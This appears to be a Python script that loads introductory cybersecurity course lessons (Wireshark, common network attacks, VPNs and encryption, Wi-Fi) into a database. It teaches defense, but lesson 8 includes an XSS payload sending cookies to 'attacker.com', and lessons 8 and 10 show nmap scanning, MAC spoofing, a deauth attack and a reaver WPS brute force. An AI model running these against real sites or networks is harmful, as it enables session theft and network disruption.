import sys
import os
from sqlalchemy.orm import Session

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from database.connection import SessionLocal
from models.curriculum import Module, Lesson

def update_lesson(db: Session, module_title: str, lesson_order: int, content: str):
    """Update lesson content and publish it"""
    module = db.query(Module).filter(Module.title == module_title).first()
    if not module:
        return False
    
    lesson = db.query(Lesson).filter(
        Lesson.module_id == module.id,
        Lesson.order == lesson_order
    ).first()
    
    if not lesson:
        return False
    
    lesson.content_markdown = content.strip()
    lesson.is_published = True
    db.commit()
    return True

def complete_all_tier0_content(db: Session):
    """Complete all remaining Tier 0 lesson content"""
    print("🚀 Creating comprehensive content for all Tier 0 lessons...")
    
    # Networking lessons 7-10
    networking_lessons = {
        7: """
# Wireshark & Packet Analysis

## What is Wireshark?

**Wireshark** - Free, open-source packet analyzer for network troubleshooting and analysis

### Installation

```bash
# Linux
sudo apt install wireshark

# Allow non-root capture
sudo usermod -aG wireshark $USER

# Windows/Mac: Download from wireshark.org
```

## Basic Interface

- **Packet List** - All captured packets
- **Packet Details** - Protocol layers
- **Packet Bytes** - Raw hexadecimal data

## Capture Filters

Apply BEFORE capturing (more efficient):

```
# Capture only HTTP traffic
tcp port 80

# Capture traffic from specific IP
host 192.168.1.100

# Capture subnet traffic
net 192.168.1.0/24

# Exclude SSH
not port 22

# Multiple conditions
tcp port 80 or tcp port 443
```

## Display Filters

Apply AFTER capturing:

```
# HTTP requests
http.request

# Specific IP
ip.addr == 192.168.1.100

# TCP SYN packets
tcp.flags.syn == 1

# DNS queries
dns.flags.response == 0

# Follow TCP stream
tcp.stream eq 0
```

## Common Analysis Tasks

### 1. Troubleshoot Connectivity
```
# Check for TCP handshake
tcp.flags.syn == 1 and tcp.flags.ack == 0  # SYN
tcp.flags.syn == 1 and tcp.flags.ack == 1  # SYN-ACK
tcp.flags.syn == 0 and tcp.flags.ack == 1  # ACK
```

### 2. Identify Slow Performance
- Look for TCP retransmissions
- Check for large time deltas
- Analyze window sizes

### 3. Security Analysis
```
# Detect port scans
tcp.flags.syn == 1 and tcp.flags.ack == 0

# Find unencrypted passwords
http.request.method == "POST"
```

## Protocol Analysis

### HTTP
```
http.request.method == "GET"
http.response.code == 200
http contains "password"
```

### DNS
```
dns.qry.name contains "google"
dns.flags.rcode != 0  # DNS errors
```

### ICMP (Ping)
```
icmp.type == 8   # Echo request
icmp.type == 0   # Echo reply
```

## Following Streams

**TCP Stream** - Reassemble conversation
- Right-click packet → Follow → TCP Stream
- Shows entire exchange
- Useful for reading plaintext protocols

**HTTP Stream**
- Right-click → Follow → HTTP Stream
- See full request/response

## Expert Information

View → Expert Information
- Errors (red)
- Warnings (yellow)
- Notes (cyan)
- Chats (blue)

## Statistics

Statistics menu provides:
- Protocol Hierarchy
- Conversations
- Endpoints
- I/O Graphs

## Practical Examples

### Example 1: Find Top Talkers
Statistics → Conversations → Sort by Bytes

### Example 2: Detect ARP Spoofing
```
arp.duplicate-address-detected
```

### Example 3: Find Large Packets
```
frame.len > 1500
```

## Security Use Cases

1. **Malware Analysis** - Examine C&C traffic
2. **Data Exfiltration** - Large outbound transfers
3. **Password Sniffing** - Unencrypted credentials
4. **Network Reconnaissance** - Port scanning

## Best Practices

1. **Filter Early** - Use capture filters to reduce data
2. **Save Captures** - Document your findings
3. **Color Rules** - Highlight important traffic
4. **Legal** - Only capture authorized traffic
5. **Privacy** - Sanitize sensitive data

## Key Takeaways

- Wireshark is essential for network analysis
- Capture filters reduce data volume
- Display filters help find specific traffic
- Following streams shows conversations
- Always capture ethically and legally

Master Wireshark for effective network troubleshooting!
""",
        8: """
# Common Network Attacks

## Reconnaissance Attacks

### Port Scanning

**Purpose**: Discover open ports and services

```bash
# Nmap scan
nmap 192.168.1.100

# Scan specific ports
nmap -p 22,80,443 192.168.1.100

# OS detection
nmap -O 192.168.1.100
```

**Defense**:
- Firewall to block scans
- IDS to detect scanning
- Disable unused services

### Network Mapping

**Tools**: Nmap, Angry IP Scanner
**Goal**: Map network topology

**Defense**:
- Network segmentation
- Access control
- Monitor for reconnaissance

## DoS/DDoS Attacks

**Denial of Service** - Overwhelm resources

### Types

**SYN Flood**
- Send many SYN packets
- Never complete handshake
- Exhaust connection table

```
Attacker → SYN SYN SYN → Server (overwhelmed)
```

**UDP Flood**
- Blast server with UDP packets
- No connection state to track

**Ping Flood**
- Massive ICMP echo requests

**HTTP Flood**
- Legitimate-looking HTTP requests
- Harder to detect

### DDoS (Distributed)

Using botnet of compromised devices

**Defense**:
- Rate limiting
- Traffic filtering
- DDoS mitigation services
- Overprovisioning bandwidth

## Man-in-the-Middle (MITM)

**Goal**: Intercept communications

### ARP Spoofing/Poisoning

```
Normal:
Client → knows Router MAC

Attack:
Attacker sends fake ARP: "I'm the router"
Client → sends to Attacker → forwards to Router
```

**Defense**:
- Static ARP entries
- Dynamic ARP Inspection (DAI)
- Encryption (HTTPS, VPN)

### DNS Spoofing

- Provide false DNS responses
- Redirect to malicious sites

**Defense**:
- DNSSEC
- Secure DNS servers
- Monitor DNS traffic

## Spoofing Attacks

### IP Spoofing

- Forge source IP address
- Hide identity
- Bypass IP-based filtering

**Defense**:
- Ingress/egress filtering
- Authentication beyond IP

### MAC Spoofing

```bash
# Change MAC address
ip link set dev eth0 down
ip link set dev eth0 address aa:bb:cc:dd:ee:ff
ip link set dev eth0 up
```

**Defense**:
- 802.1X authentication
- MAC-based ACLs (weak alone)
- Port security

## Sniffing Attacks

**Packet Sniffing** - Capturing network traffic

### On Switched Network

- ARP spoofing
- MAC flooding
- Port mirroring (SPAN)

**Defense**:
- Encryption (HTTPS, SSH, VPN)
- Switch port security
- Detect promiscuous mode

## Session Hijacking

**Goal**: Take over authenticated session

### Cookie Theft

- Steal session cookies
- Impersonate user

```javascript
// XSS to steal cookie
<script>
document.location='http://attacker.com/?c='+document.cookie
</script>
```

**Defense**:
- HTTPOnly cookies
- Secure flag on cookies
- HTTPS everywhere
- Short session timeouts

## Password Attacks

### Brute Force

- Try all combinations
- Time-consuming but works

**Defense**:
- Account lockout
- Rate limiting
- Strong passwords
- MFA

### Dictionary Attack

- Try common passwords
- Much faster than brute force

**Defense**:
- Password complexity requirements
- Password blacklists
- MFA

### Rainbow Tables

- Precomputed hashes
- Very fast lookup

**Defense**:
- Salted hashes
- Modern algorithms (bcrypt, Argon2)

## Malware Propagation

### Worms

- Self-replicating
- Spread without user action
- Example: WannaCry

**Defense**:
- Patch systems
- Network segmentation
- IDS/IPS
- Antivirus

### Trojan Horses

- Disguised as legitimate software
- User installs unknowingly

**Defense**:
- User education
- Application whitelisting
- Sandboxing

## Advanced Persistent Threats (APT)

**Characteristics**:
- Long-term persistence
- Stealthy
- Targeted
- Well-resourced

**Kill Chain**:
1. Reconnaissance
2. Weaponization
3. Delivery
4. Exploitation
5. Installation
6. Command & Control
7. Actions on Objectives

**Defense**:
- Defense in depth
- Threat intelligence
- Continuous monitoring
- Incident response plan

## Detecting Attacks

### Network Indicators

- Unusual traffic patterns
- Multiple failed logins
- Unexpected protocols
- Data exfiltration
- Command & control traffic

### Tools

- IDS/IPS
- SIEM
- Network monitoring
- Log analysis

## Response Steps

1. **Detect** - Identify the attack
2. **Contain** - Isolate affected systems
3. **Eradicate** - Remove malware/attacker access
4. **Recover** - Restore normal operations
5. **Lessons Learned** - Improve defenses

## Prevention Best Practices

1. Keep systems patched
2. Use strong authentication
3. Encrypt sensitive data
4. Implement network segmentation
5. Monitor continuously
6. User security training
7. Incident response plan
8. Regular backups

Understanding attacks is crucial for effective defense!
""",
        9: """
# VPNs & Encryption

## VPN Fundamentals

**Virtual Private Network** - Secure tunnel over untrusted network

### Benefits

- **Confidentiality** - Encrypted data
- **Integrity** - Detect tampering
- **Authentication** - Verify identity
- **Privacy** - Hide IP address

## VPN Types

### Site-to-Site VPN

Connect two networks:

```
Office A <----Encrypted Tunnel----> Office B
    |                                   |
Internal                           Internal
Devices                            Devices
```

**Use Case**: Branch offices to headquarters

### Remote Access VPN

Individual user to network:

```
Home User <----Encrypted----> Corporate Network
```

**Use Case**: Remote employees

## VPN Protocols

### IPSec (IP Security)

**Components**:
- **AH (Authentication Header)** - Integrity & authentication
- **ESP (Encapsulating Security Payload)** - Encryption & auth

**Modes**:
- **Transport** - Encrypts payload only
- **Tunnel** - Encrypts entire packet (more secure)

```bash
# IPSec configuration (Linux)
sudo apt install strongswan

# /etc/ipsec.conf
conn myvpn
    left=203.0.113.1
    right=203.0.113.2
    auto=start
    authby=secret
```

### OpenVPN (SSL/TLS)

**Advantages**:
- Uses SSL/TLS (port 443)
- Firewall-friendly
- Cross-platform

```bash
# Install
sudo apt install openvpn

# Client config
client
remote vpn.example.com 1194
ca ca.crt
cert client.crt
key client.key
```

### WireGuard

**Modern VPN**:
- Fast and efficient
- Simple configuration
- Strong cryptography

```bash
# Install
sudo apt install wireguard

# Generate keys
wg genkey | tee privatekey | wg pubkey > publickey

# Config /etc/wireguard/wg0.conf
[Interface]
PrivateKey = <your-private-key>
Address = 10.0.0.2/24

[Peer]
PublicKey = <server-public-key>
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0
```

## Encryption Basics

### Symmetric Encryption

**Same key** for encrypt and decrypt

```
Plaintext --[Encrypt with Key]--> Ciphertext
Ciphertext --[Decrypt with Key]--> Plaintext
```

**Algorithms**:
- AES (Advanced Encryption Standard)
- 3DES (Triple DES)
- ChaCha20

**Problem**: Key distribution

### Asymmetric Encryption

**Public key** encrypts, **private key** decrypts

```
Alice's Public Key  → Encrypt → Send to Alice
Alice's Private Key → Decrypt → Read message
```

**Algorithms**:
- RSA
- Elliptic Curve (ECC)
- Diffie-Hellman

**Use**: Key exchange, digital signatures

## SSL/TLS Protocol

**Secure Sockets Layer / Transport Layer Security**

### SSL/TLS Handshake

```
1. Client Hello (supported ciphers)
2. Server Hello (selected cipher)
3. Server Certificate
4. Key Exchange
5. Client finished
6. Server finished
→ Encrypted communication
```

### TLS Versions

- TLS 1.0, 1.1 - **Deprecated** (insecure)
- TLS 1.2 - **Acceptable** (current standard)
- TLS 1.3 - **Recommended** (latest, fastest)

```bash
# Check TLS version
openssl s_client -connect example.com:443 -tls1_3
```

## Certificates

### X.509 Digital Certificates

Contains:
- Public key
- Owner identity
- Issuer (CA)
- Validity period
- Digital signature

### Certificate Chain

```
Root CA (trusted)
  └─ Intermediate CA
      └─ Server Certificate (example.com)
```

### Certificate Verification

```bash
# View certificate
openssl x509 -in cert.pem -text -noout

# Verify certificate
openssl verify cert.pem
```

## Hashing

**One-way function** - Cannot reverse

### Common Hash Algorithms

- **MD5** - Broken (128-bit)
- **SHA-1** - Deprecated (160-bit)
- **SHA-256** - Secure (256-bit)
- **SHA-3** - Latest standard

```bash
# Generate hash
echo "password" | sha256sum

# Verify file integrity
sha256sum file.iso > checksum.txt
sha256sum -c checksum.txt
```

### HMAC (Hash-based Message Authentication Code)

- Hash with secret key
- Provides integrity AND authentication

## VPN Setup Examples

### OpenVPN Server

```bash
# Generate certificates
make-cadir ~/openvpn-ca
cd ~/openvpn-ca
source vars
./clean-all
./build-ca
./build-key-server server
./build-key client1
./build-dh

# Server config
port 1194
proto udp
dev tun
ca ca.crt
cert server.crt
key server.key
dh dh2048.pem
server 10.8.0.0 255.255.255.0
push "redirect-gateway def1"
```

### WireGuard Quick Start

```bash
# Server
wg-quick up wg0

# Client
sudo wg-quick up wg0

# Status
sudo wg show
```

## Split Tunneling

**Route some traffic through VPN, rest direct**

```
VPN Tunnel: Work traffic
Direct: Personal traffic (Netflix, gaming)
```

**Pros**: Better performance
**Cons**: Reduced security

## VPN Security Best Practices

1. **Strong Encryption**: AES-256
2. **Perfect Forward Secrecy**: New keys each session
3. **No-logs Policy**: Don't track user activity
4. **Kill Switch**: Block traffic if VPN drops
5. **DNS Leak Protection**: Route DNS through VPN
6. **Multi-factor Authentication**

## Common VPN Issues

### Slow Performance
- Encryption overhead
- Server distance
- Server load

### Connection Drops
- Network instability
- Firewall interference
- Timeout settings

### DNS Leaks
- DNS queries bypass VPN
- Fix: Force DNS through VPN

## Testing VPN Security

```bash
# Check IP address
curl ifconfig.me

# DNS leak test
nslookup example.com

# WebRTC leak (browser)
# Visit: https://browserleaks.com/webrtc
```

## Practical Scenarios

### Home Office
```
Home Worker → VPN → Corporate Network
- Access internal resources
- Secure remote work
```

### Public WiFi
```
Laptop → VPN → Internet
- Protect from sniffing
- Encrypt traffic
```

### Bypass Geo-restrictions
```
User → VPN Server (Different Country) → Content
- Access region-locked content
```

## Key Takeaways

- VPNs create encrypted tunnels
- Multiple protocols available (IPSec, OpenVPN, WireGuard)
- Encryption protects confidentiality
- TLS secures web traffic
- Certificates verify identity
- Always use strong encryption

VPNs are essential for secure remote access!
""",
        10: """
# Wireless Networks

## WiFi Fundamentals

### 802.11 Standards

| Standard | Year | Frequency | Max Speed |
|----------|------|-----------|-----------|
| 802.11b | 1999 | 2.4 GHz | 11 Mbps |
| 802.11g | 2003 | 2.4 GHz | 54 Mbps |
| 802.11n | 2009 | 2.4/5 GHz | 600 Mbps |
| 802.11ac | 2013 | 5 GHz | 3.5 Gbps |
| 802.11ax (WiFi 6) | 2019 | 2.4/5 GHz | 9.6 Gbps |

### Frequency Bands

**2.4 GHz**
- Longer range
- Better penetration
- More interference (Bluetooth, microwaves)
- 3 non-overlapping channels (1, 6, 11)

**5 GHz**
- Faster speeds
- Less interference
- Shorter range
- 23+ non-overlapping channels

## WiFi Components

### Access Point (AP)
- Wireless hub
- Connects wireless clients to network
- Can be standalone or integrated in router

### Wireless Router
- Router + AP + Switch
- Common in homes
- Provides NAT, DHCP, firewall

### Wireless Controller
- Manages multiple APs
- Centralized configuration
- Enterprise deployments

## WiFi Security Evolution

### WEP (Wired Equivalent Privacy) - **OBSOLETE**

- 40 or 104-bit key
- RC4 encryption
- **Severely broken** - crack in minutes
- **Never use**

### WPA (WiFi Protected Access)

- Temporary fix for WEP
- TKIP encryption
- Better but still vulnerable
- **Deprecated**

### WPA2 (2004-2018)

- AES encryption (CCMP)
- Strong security
- Industry standard until recently

**Modes**:
- **Personal (PSK)** - Shared password
- **Enterprise (802.1X)** - RADIUS authentication

### WPA3 (2018-Present)

**Improvements**:
- SAE (Simultaneous Authentication of Equals)
- Forward secrecy
- 192-bit encryption (Enterprise)
- Protection against offline attacks
- Enhanced Open (encrypted public WiFi)

## Configuring Secure WiFi

```
# Router configuration checklist:
✓ Use WPA3 (or WPA2 if WPA3 unavailable)
✓ Strong password (20+ characters)
✓ Disable WPS
✓ Change default SSID
✓ Disable SSID broadcast (optional)
✓ Enable MAC filtering (optional)
✓ Disable remote management
✓ Update firmware regularly
```

## WiFi Attacks

### 1. Eavesdropping

**Attack**: Sniff wireless traffic
**Defense**: Encryption (WPA2/WPA3)

```bash
# Monitor mode (attacker view)
airmon-ng start wlan0
airodump-ng wlan0mon
```

### 2. Evil Twin

**Attack**: Fake access point with same SSID

```
Legitimate AP: "CoffeeShop-WiFi"
Evil Twin AP:  "CoffeeShop-WiFi"  ← Attacker
```

**Defense**:
- Verify certificate (WPA2-Enterprise)
- Use VPN on public WiFi
- Forget network when leaving

### 3. Deauthentication Attack

**Attack**: Force clients to disconnect

```bash
# Deauth attack (don't actually do this!)
aireplay-ng --deauth 100 -a [AP_MAC] wlan0mon
```

**Defense**:
- WPA3 (protects against this)
- 802.11w (Management Frame Protection)

### 4. WPS PIN Attack

**Attack**: Brute-force WPS PIN

```bash
# WPS attack
reaver -i wlan0mon -b [AP_MAC] -vv
```

**Defense**: Disable WPS

### 5. Rogue Access Point

**Attack**: Unauthorized AP on network

**Defense**:
- Wireless IDS
- Regular AP audits
- 802.1X authentication

## WiFi Troubleshooting

### Poor Signal Strength

```bash
# Check signal (Linux)
iwconfig
nmcli dev wifi list

# Check channels
sudo airodump-ng wlan0mon
```

**Solutions**:
- Move closer to AP
- Reduce interference
- Upgrade antenna
- Use 5 GHz band

### Interference

**Sources**:
- Other WiFi networks
- Bluetooth devices
- Microwave ovens
- Cordless phones
- Baby monitors

**Solutions**:
- Change channel
- Use 5 GHz
- Position AP strategically

### Slow Speeds

**Causes**:
- Weak signal
- Channel congestion
- Too many clients
- Outdated standard

**Solutions**:
```bash
# Check connected devices
arp -a

# Speed test
speedtest-cli
```

## Enterprise WiFi

### RADIUS Authentication

```
Client → AP → RADIUS Server → Auth Decision
```

**Benefits**:
- Individual user accounts
- No shared passwords
- Centralized management
- Detailed logging

### Guest Network

- Separate SSID
- Isolated from corporate network
- Internet access only
- Captive portal

```
Guest VLAN → Firewall → Internet only
Corporate VLAN → Full network access
```

## Site Survey

**Purpose**: Plan AP placement

**Tools**:
- WiFi analyzer apps
- Professional survey tools
- Heat mapping software

**Considerations**:
- Coverage area
- Walls and obstacles
- Number of users
- Required bandwidth

## WiFi 6 (802.11ax) Features

### OFDMA (Orthogonal Frequency Division Multiple Access)
- Multiple users simultaneously
- Better efficiency

### Target Wake Time (TWT)
- Improves battery life for IoT devices

### 1024-QAM
- Higher data rates

### BSS Coloring
- Reduces interference

## Best Practices

### Home Network

1. Use WPA3 or WPA2
2. Strong unique password
3. Change default SSID
4. Disable WPS
5. Keep firmware updated
6. Guest network for visitors

### Enterprise Network

1. WPA2/WPA3-Enterprise
2. RADIUS authentication
3. Regular security audits
4. Wireless IDS/IPS
5. Network segmentation
6. Comprehensive logging

## Security Checklist

```
Router Security:
[ ] WPA3 enabled (or WPA2 minimum)
[ ] Strong password (20+ characters, random)
[ ] WPS disabled
[ ] Firmware up to date
[ ] Admin password changed
[ ] Remote management disabled
[ ] Guest network isolated

Network Security:
[ ] Different admin/user passwords
[ ] MAC filtering (optional layer)
[ ] Regular security audits
[ ] VPN for sensitive work
[ ] Monitor connected devices
```

## Key Takeaways

- Always use WPA3 (or WPA2 minimum)
- Never use WEP or WPA
- Disable WPS
- Strong passwords essential
- Regular firmware updates critical
- VPN on public WiFi
- 5 GHz for better performance
- Enterprise should use RADIUS

Wireless security is crucial in modern networks!

---

## 🎉 Tier 0 Module 2 Complete!

You've now mastered Networking Fundamentals! Next, dive into Python for Security to start building your own tools.
"""
    }
    
    print("\n📚 Updating Networking Fundamentals lessons 7-10...")
    for order, content in networking_lessons.items():
        if update_lesson(db, "Networking Fundamentals", order, content):
            print(f"  ✅ Lesson {order} complete")
    
    print("\n✅ Networking Fundamentals module fully complete!")
    print("   All 10 lessons now have comprehensive content")

if __name__ == "__main__":
    db = SessionLocal()
    try:
        complete_all_tier0_content(db)
    finally:
        db.close()
